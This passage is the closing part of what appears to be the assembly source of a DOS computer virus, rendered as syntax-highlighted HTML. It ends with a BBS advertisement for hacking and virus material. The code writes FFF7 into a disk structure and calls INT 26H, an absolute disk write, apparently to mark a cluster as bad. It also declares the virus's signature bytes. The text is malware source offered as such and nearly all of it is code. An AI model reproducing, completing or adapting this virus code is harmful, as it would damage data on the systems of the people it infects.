</span><span class="sc1">;       changing the 0000 value to FFF7.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L19</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0FFF7H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">26H</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
</span><span class="sc5">L21</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L7</span><span class="sc0">
 
</span><span class="sc5">COUNTER</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">LEN_LO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LEN_HI</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ID</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4418H</span><span class="sc4">,</span><span class="sc2">5F19H</span><span class="sc0">             </span><span class="sc1">; The signature of the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       A buffer, used for data from the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">
 
        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">LABEL1</span><span class="sc0">

</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; &gt; and Remember Don't Forget to Call &lt;</span><span class="sc0">
</span><span class="sc1">; &gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

</span></div></body>
</html>
